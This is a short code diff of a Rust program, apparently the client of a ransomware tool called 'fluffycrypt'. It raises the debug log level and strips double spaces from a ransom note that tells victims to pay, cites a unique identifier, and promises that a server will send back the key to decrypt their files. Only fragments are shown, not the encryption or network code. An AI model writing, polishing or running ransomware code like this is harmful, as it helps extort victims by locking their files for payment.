@@ -46,7 +46,7 @@ async fn main() {
     // set up monitor
     let mut builder = Subscriber::builder();
     if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
-        builder = builder.with_max_level(Level::DEBUG);
+        builder = builder.with_max_level(Level::TRACE);
     }
     builder = builder.with_thread_ids(true);
     let subscriber = builder.finish();
@@ -194,6 +194,7 @@ async fn main() {
                         We have generated a unique identifier for you, it's: {}\nOnce we've recieved payment, you can run the executable one \
                         more time. Our server will \ntransmit your key back and this client will immediately decrypt your files without further \
                         action on your side.\nWe look forward to hearing from you.", ucid);
+                    let content = content.replace("  ", "");
                     let _ = write(directory, &content);
                     // registration accepted, no need to retry
                     event!(
